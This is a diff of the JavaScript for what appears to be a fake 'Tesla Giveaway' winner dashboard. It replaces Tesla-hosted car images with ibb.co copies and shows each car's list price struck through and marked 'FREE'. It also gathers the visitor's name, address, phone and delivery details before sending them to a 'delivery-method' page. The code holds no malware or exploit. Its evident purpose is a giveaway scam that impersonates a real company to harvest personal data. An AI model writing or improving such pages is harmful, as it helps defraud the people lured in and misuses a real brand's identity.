@@ -2,36 +2,36 @@
 // ║     Tesla Giveaway — Winner Dashboard Logic              ║
 // ╚══════════════════════════════════════════════════════════╝
 
+// Car images match homepage exactly (ibb.co)
 var cars = [
-  { id:'model3',  name:'Model 3',    color:'Pearl White',      price:'$38,990',  emoji:'🚗',
-    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-3.png',
-    specs:['3.1s 0–60','333mi Range','AWD Dual Motor','5★ Safety'], badge:'Most Popular' },
-  { id:'modely',  name:'Model Y',    color:'Midnight Silver',  price:'$44,990',  emoji:'🚙',
-    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-Y.png',
-    specs:['3.5s 0–60','330mi Range','76 cu ft Cargo','7 Seats'], badge:'Best Seller' },
-  { id:'models',  name:'Model S',    color:'Ultra Red',        price:'$74,990',  emoji:'🏎️',
-    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-S.png',
-    specs:['1.99s 0–60','396mi Range','1,020 hp Plaid','200mph Top'], badge:'Ludicrous' },
-  { id:'modelx',  name:'Model X',    color:'Deep Blue',        price:'$79,990',  emoji:'🚐',
-    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-X.png',
-    specs:['2.5s 0–60','333mi Range','Falcon Wing Doors','7 Seats'], badge:'Iconic' },
-  { id:'cybertruck', name:'Cybertruck', color:'Stainless Steel', price:'$60,990', emoji:'🛻',
-    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Cybertruck.png',
-    specs:['2.6s 0–60','340mi Range','11,000lb Towing','Exo-skeleton'], badge:'Tough' },
-  { id:'roadster', name:'Roadster',  color:'Signature Red',    price:'$200,000', emoji:'🏎️',
-    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/tesla-roadster.png',
-    specs:['1.1s 0–60','620mi Range','250+ mph Top','4 Seats'], badge:'Ultimate' },
+  { id:'cybertruck', name:'Cybertruck', price:'$71,985', emoji:'🛻',
+    img:'https://i.ibb.co/Psv2bHHT/0ab12312-ffdc-4474-bd2b-343a034e4710.png',
+    specList:['325 mi Range','4.1s 0–60 mph','112 mph Top Speed','5 Seats','Dual Motor AWD'],
+    badge:'Built Tough', detailPage:'vehicles/cybertruck.html' },
+  { id:'modely', name:'Model Y', price:'$41,380', emoji:'🚙',
+    img:'https://i.ibb.co/vvH8dXZm/57a721cf-f5f9-42c3-91d6-f0d7d08977b7.png',
+    specList:['321 mi Range','6.8s 0–60 mph','135 mph Top Speed','5–7 Seats','Rear-Wheel Drive'],
+    badge:'Best Seller', detailPage:'vehicles/modely.html' },
+  { id:'models', name:'Model S', price:'$111,380', emoji:'🏎️',
+    img:'https://i.ibb.co/mrRWYHYd/ebcd3520-52de-4781-80db-7311c551ea99.png',
+    specList:['410 mi Range','3.1s 0–60 mph','200 mph Top Speed','5 Seats','Dual Motor AWD'],
+    badge:'Luxury Performance', detailPage:'vehicles/models.html' },
+  { id:'model3', name:'Model 3', price:'$38,380', emoji:'🚗',
+    img:'https://i.ibb.co/MxCqNz6P/80f15904-8202-4901-ac2c-b9a1a66bb1df.png',
+    specList:['321 mi Range','5.8s 0–60 mph','140 mph Top Speed','5 Seats','Rear-Wheel Drive'],
+    badge:'Most Popular', detailPage:'vehicles/model3.html' },
+  { id:'modelx', name:'Model X', price:'$116,380', emoji:'🚐',
+    img:'https://i.ibb.co/Y4N4GP4b/05586fa8-0530-4b0a-b70a-7b13c39dbcb7.png',
+    specList:['352 mi Range','3.8s 0–60 mph','149 mph Top Speed','7 Seats','Dual Motor AWD'],
+    badge:'Iconic Design', detailPage:'vehicles/modelx.html' }
 ];
 
 var selectedCar = null;
 
-// ── INIT ─────────────────────────────────────────────────────
 document.addEventListener('DOMContentLoaded', async function() {
-  // Persist session from email-verify redirect
   var urlSession = getParam('session');
   if (urlSession) {
     saveSession(urlSession);
-    // Clean URL
     if (window.history && window.history.replaceState) {
       window.history.replaceState(null, '', 'dashboard.html');
     }
@@ -51,7 +51,6 @@ document.addEventListener('DOMContentLoaded', async function() {
       return; 
     }
 
-    // Show verified banner (only when coming from email link)
     if (urlSession) {
       var banner = document.getElementById('verifiedBanner');
       if (banner) {
@@ -61,13 +60,11 @@ document.addEventListener('DOMContentLoaded', async function() {
           nameDisplay.textContent = data.user.firstName || data.user.email.split('@')[0];
         }
       }
-      // Launch confetti!
       launchConfetti(50);
     }
 
     window._userData = data.user;
 
-    // Pre-fill name in delivery form
     var nameInput = document.querySelector('[name="fullName"]');
     if (nameInput && data.user.firstName) {
       nameInput.value = (data.user.firstName + ' ' + (data.user.lastName || '')).trim();
@@ -84,25 +81,24 @@ document.addEventListener('DOMContentLoaded', async function() {
   renderCars();
 });
 
-// ── CAR GRID ──────────────────────────────────────────────────
 function renderCars() {
   var grid = document.getElementById('carGrid');
   if (!grid) return;
   
   grid.innerHTML = cars.map(function(car) {
-    return '<div class="car-card" onclick="selectCar(\'' + car.id + '\')" id="card-' + car.id + '">' +
-      '<div class="sel-check">✓</div>' +
-      '<div class="car-img-area">' +
-        '<img src="' + car.img + '" alt="Tesla ' + car.name + '" ' +
-          'onerror="this.outerHTML=\'<div style=\\\'font-size:52px;padding:30px;\\\'>' + car.emoji + '</div>\'" ' +
-          'loading="lazy">' +
+    return '<div class="dash-car-card" onclick="window.location.href=\'' + car.detailPage + '?session=' + (getSession()||'') + '\'" style="cursor:pointer;background:#fff;border:1px solid rgba(0,0,0,.06);border-radius:18px;overflow:hidden;transition:all .35s cubic-bezier(.4,0,.2,1);box-shadow:0 6px 24px rgba(0,0,0,.04);display:flex;flex-direction:column;height:100%;">' +
+      '<div style="height:220px;background:radial-gradient(circle at center,rgba(227,25,55,.012) 0%,rgba(0,0,0,.02) 100%),#fcfcfc;display:flex;align-items:center;justify-content:center;padding:24px;position:relative;border-bottom:1px solid rgba(0,0,0,.04);">' +
+        '<span style="position:absolute;top:16px;right:16px;background:rgba(227,25,55,.07);color:var(--red);border:1px solid rgba(227,25,55,.12);padding:4px 12px;border-radius:99px;font-size:10px;font-weight:700;letter-spacing:.04em;z-index:2;">' + car.badge + '</span>' +
+        '<img src="' + car.img + '" alt="Tesla ' + car.name + '" style="height:92%;max-width:100%;object-fit:contain;transition:transform .5s cubic-bezier(.4,0,.2,1);filter:drop-shadow(0 6px 12px rgba(0,0,0,.1));" onerror="this.outerHTML=\'<div style=font-size:56px;>' + car.emoji + '</div>\'">' +
       '</div>' +
-      '<div class="car-body">' +
-        '<div class="car-badge">' + car.badge + '</div>' +
-        '<div class="car-title">Tesla ' + car.name + '</div>' +
-        '<div class="car-meta">' + car.color + ' · ' + car.price + '</div>' +
-        '<div class="car-specs">' +
-          car.specs.map(function(s) { return '<span class="car-spec-pill">' + s + '</span>'; }).join('') +
+      '<div style="padding:24px 22px 26px;">' +
+        '<h3 style="font-size:22px;font-weight:800;color:#111;letter-spacing:-.5px;margin:0 0 4px;">Tesla ' + car.name + '</h3>' +
+        '<div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;background:rgba(0,0,0,.015);padding:8px 14px;border-radius:8px;border:1px solid rgba(0,0,0,.03);width:fit-content;">' +
+          '<span style="font-size:14px;text-decoration:line-through;color:rgba(0,0,0,.35);font-weight:500;">' + car.price + '</span>' +
+          '<span style="font-size:12px;font-weight:800;background:var(--red);color:#fff;padding:3px 10px;border-radius:5px;letter-spacing:.05em;box-shadow:0 2px 8px rgba(227,25,55,.3);">FREE</span>' +
+        '</div>' +
+        '<div class="dash-specs" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">' +
+          car.specList.map(function(s){ var parts=s.split(' '); var v=parts[0]+(parts[1]==='mi'?' mi':''); var l=parts.slice(parts[1]==='mi'?2:1).join(' '); return '<div style="background:rgba(0,0,0,.01);border:1px solid rgba(0,0,0,.025);padding:8px 10px;border-radius:8px;display:flex;flex-direction:column;gap:2px;"><span style="font-size:14px;font-weight:700;color:#111;">'+v+'</span><span style="font-size:10px;color:rgba(0,0,0,.45);font-weight:500;">'+l+'</span></div>'; }).join('') +
         '</div>' +
       '</div>' +
     '</div>';
@@ -110,13 +106,12 @@ function renderCars() {
 }
 
 function selectCar(carId) {
-  var cards = document.querySelectorAll('.car-card');
+  var cards = document.querySelectorAll('.dash-car-card');
   for (var i = 0; i < cards.length; i++) cards[i].classList.remove('selected');
   
   var card = document.getElementById('card-' + carId);
   if (card) { 
     card.classList.add('selected'); 
-    card.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); 
   }
   
   selectedCar = null;
@@ -124,7 +119,6 @@ function selectCar(carId) {
     if (cars[j].id === carId) { selectedCar = cars[j]; break; }
   }
   
-  // Auto-advance to delivery step
   if (selectedCar) {
     setStep(3);
     document.getElementById('stepSelectCar').style.display = 'none';
@@ -133,28 +127,9 @@ function selectCar(carId) {
     deliveryStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
     
     document.getElementById('selectedCarTitle').textContent = 'Tesla ' + selectedCar.name;
-    document.getElementById('selectedCarColor').textContent = selectedCar.color;
+    document.getElementById('selectedCarColor').textContent = selectedCar.price + ' · FREE';
     document.getElementById('selectedCarEmoji').textContent = selectedCar.emoji;
   }
-}
-
-function confirmCar() {
-  if (!selectedCar) {
-    showToast('Please select a Tesla vehicle first.', 'warning');
-    return;
-  }
-  
-  // Update step bar
-  setStep(3);
-  document.getElementById('stepSelectCar').style.display = 'none';
-  var deliveryStep = document.getElementById('stepDelivery');
-  deliveryStep.style.display = 'block';
-  deliveryStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
-  
-  // Update selected car summary
-  document.getElementById('selectedCarTitle').textContent = 'Tesla ' + selectedCar.name;
-  document.getElementById('selectedCarColor').textContent = selectedCar.color;
-  document.getElementById('selectedCarEmoji').textContent = selectedCar.emoji;
 }
 
 function goBackToCars() {
@@ -164,7 +139,6 @@ function goBackToCars() {
   window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
-// ── STEP INDICATOR ────────────────────────────────────────────
 function setStep(n) {
   var stepIds = ['sc1','sc2','sc3','sc4'];
   var labelIds = ['sl1t','sl2t','sl3t','sl4t'];
@@ -174,59 +148,44 @@ function setStep(n) {
     var stepNum = i + 1;
     var circle = document.getElementById(stepIds[i]);
     var label = document.getElementById(labelIds[i]);
-    
     if (!circle) continue;
-    
     if (stepNum < n) {
-      circle.className = 's-circle done'; 
-      circle.textContent = '✓';
+      circle.className = 's-circle done'; circle.textContent = '\u2713';
       if (label) label.className = 's-label done';
     } else if (stepNum === n) {
-      circle.className = 's-circle active'; 
-      circle.textContent = String(stepNum);
+      circle.className = 's-circle active'; circle.textContent = String(stepNum);
       if (label) label.className = 's-label active';
     } else {
-      circle.className = 's-circle'; 
-      circle.textContent = String(stepNum);
+      circle.className = 's-circle'; circle.textContent = String(stepNum);
       if (label) label.className = 's-label';
     }
   }
-  
   for (var j = 0; j < lineIds.length; j++) {
     var line = document.getElementById(lineIds[j]);
     if (!line) continue;
-    if (j + 2 < n) {
-      line.className = 's-line done';
-    } else {
-      line.className = 's-line';
-    }
+    if (j + 2 < n) line.className = 's-line done';
+    else line.className = 's-line';
   }
 }
 
-// ── DELIVERY FORM ─────────────────────────────────────────────
 document.addEventListener('submit', async function(e) {
   if (e.target.id !== 'deliveryForm') return;
   e.preventDefault();
   var form = e.target;
-
   var deliveryDetails = {
-    fullName:      (form.fullName && form.fullName.value || '').trim(),
-    address:       (form.address && form.address.value || '').trim(),
-    city:          (form.city && form.city.value || '').trim(),
-    state:         (form.state && form.state.value || '').trim(),
-    zipCode:       (form.zipCode && form.zipCode.value || '').trim(),
-    country:       (form.country && form.country.value || '').trim(),
-    phone:         (form.deliveryPhone && form.deliveryPhone.value || '').trim(),
-    instructions:  (form.instructions && form.instructions.value || '').trim(),
+    fullName: (form.fullName && form.fullName.value || '').trim(),
+    address: (form.address && form.address.value || '').trim(),
+    city: (form.city && form.city.value || '').trim(),
+    state: (form.state && form.state.value || '').trim(),
+    zipCode: (form.zipCode && form.zipCode.value || '').trim(),
+    country: (form.country && form.country.value || '').trim(),
+    phone: (form.deliveryPhone && form.deliveryPhone.value || '').trim(),
+    instructions: (form.instructions && form.instructions.value || '').trim(),
   };
-
-  if (!deliveryDetails.fullName || !deliveryDetails.address || !deliveryDetails.city ||
-      !deliveryDetails.state || !deliveryDetails.zipCode || !deliveryDetails.country) {
+  if (!deliveryDetails.fullName || !deliveryDetails.address || !deliveryDetails.city || !deliveryDetails.state || !deliveryDetails.zipCode || !deliveryDetails.country) {
     showToast('Please fill in all required fields.', 'error');
     return;
   }
-
-  // Save to localStorage and proceed to delivery method page
   try {
     localStorage.setItem('tesla_selected_car', JSON.stringify(selectedCar));
     localStorage.setItem('tesla_delivery_details', JSON.stringify(deliveryDetails));
@@ -235,7 +194,6 @@ document.addEventListener('submit', async function(e) {
     showToast('Unable to save your progress. Please try again.', 'error');
     return;
   }
-
   window.location.href = 'delivery-method.html';
 });
 
